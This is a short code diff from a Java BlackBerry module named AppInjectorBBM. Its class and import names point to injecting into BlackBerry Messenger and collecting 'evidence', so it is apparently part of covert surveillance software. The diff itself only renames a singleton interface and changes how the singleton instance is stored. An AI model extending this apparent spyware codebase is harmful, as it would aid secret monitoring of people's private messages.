@@ -12,12 +12,13 @@ package blackberry.module.im;
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.Singleton;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.injection.AppInjectorInterface;
 import blackberry.injection.KeyInjector;
-import blackberry.interfaces.Singleton;
+import blackberry.interfaces.iSingleton;
 import blackberry.utils.Utils;
 
 /**
@@ -26,7 +27,7 @@ import blackberry.utils.Utils;
  * @author zeno
  * 
  */
-public class AppInjectorBBM implements AppInjectorInterface, Singleton {
+public class AppInjectorBBM implements AppInjectorInterface, iSingleton {
     //#ifdef DEBUG
     private static Debug debug = new Debug("AppInjectorBBM", DebugLevel.VERBOSE);
     //#endif
@@ -47,7 +48,7 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
             if (instance == null) {
                 final AppInjectorBBM singleton = new AppInjectorBBM();
 
-                RuntimeStore.getRuntimeStore().put(GUID, singleton);
+                Singleton.self().put(GUID, singleton);
                 instance = singleton;
             }
         }
